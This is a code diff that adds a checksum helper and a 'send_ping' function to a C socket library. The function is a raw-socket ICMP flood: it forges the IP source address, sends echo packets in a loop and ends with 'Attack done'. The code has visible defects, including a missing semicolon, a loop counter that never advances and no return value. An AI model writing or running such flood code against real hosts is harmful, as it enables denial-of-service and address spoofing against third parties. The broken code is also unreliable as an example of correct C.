@@ -7,6 +7,7 @@
 #include <stdlib.h>
 #include <string.h>
 
+
 int socketlib_error(const char* str)
 {
   fprintf(stderr, "ERROR in socketlib: %s\nErrno: %d, Errnomsg: %s\n",
@@ -148,6 +149,7 @@ int create_server_client(const char *node, const char *port,
  int ret_value; /*Used to store return values from function calls*/
  int optval = 1;
 
+
  /*clearing all variables*/
  memset( &hints, 0, sizeof(hints) );
  serverinfo = 0;
@@ -218,4 +220,102 @@ int connect_to_tcp_server(const char *node, const char *port)
 {
   return create_server_client(node, port, SOCK_STREAM, IPPROTO_TCP, CLIENT);  
 }
+/*Copied from online, computes internes checksum */ 
+unsigned short in_cksum(unsigned short *ptr, int nbytes)
+{
+    register long sum;
+    u_short oddbyte;
+    register u_short answer;
+ 
+    sum = 0;
+    while (nbytes > 1) {
+        sum += *ptr++;
+        nbytes -= 2;
+    }
+ 
+    if (nbytes == 1) {
+        oddbyte = 0;
+        *((u_char *) & oddbyte) = *(u_char *) ptr;
+        sum += oddbyte;
+    }
+ 
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    answer = ~sum;
+ 
+    return (answer);
+}
 
+int send_ping(char* dst, char* src)
+{
+  uint32_t dst_addr = inet_addr(dst);
+  uint32_t src_addr = inet_addr(src);
+  int sockfd;
+  int enable = 1;
+  int packet_size;
+  char *packet;
+  struct sockaddr_in servaddr;
+  
+  if ((sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    {
+      perror("Could not create raw socket");
+      return EAGAIN;
+    }
+  
+  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&enable, sizeof(enable)) == -1) 
+    {
+      perror("setsockopt failed");
+      return EACCES;
+    }
+
+
+  packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr);
+  packet = calloc(1,packet_size);
+  if(!packet) {
+    perror("Malloc");
+    close(sockfd);
+    return EAGAIN;
+  }
+
+  /*Construct ip and icmp headers*/
+  struct iphdr *ip = (struct iphdr*) packet;
+ struct icmphdr *icmp = (struct icmphdr*) (packet + sizeof(struct iphdr));
+  
+  ip->version = 4;
+  ip->ihl = 5;
+  ip->tos = 0;
+  ip->tot_len = htons(packet_size);
+  ip->id = rand();
+  ip->frag_off = 0;
+  ip->ttl = 15
+  ip->protocol = IPPROTO_ICMP;
+  ip->saddr = src_addr;
+  ip->daddr = dst_addr;
+    
+  icmp->type = ICMP_ECHO;
+  icmp->code = 0;
+  icmp->un.echo.sequence = rand();
+  icmp->un.echo.id = rand();
+  icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr));
+
+  /*Done constructing*/
+
+
+  memset(&servaddr, 0, sizeof(struct sockaddr_in));
+  servaddr.sin_family = AF_INET;
+  servaddr.sin_addr.s_addr = dst_addr;
+  
+  printf("Sending ping to %s\n", inet_ntoa(servaddr.sin_addr));
+
+  int i = 0;
+  while(i < 100000000) {
+    int sent;
+    if( (sent = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*)&servaddr, sizeof(servaddr))) <= 0) 
+    {
+      perror("Failed sendto\n");
+      return 0;
+    }
+  }
+
+  printf("Attack done");
+}
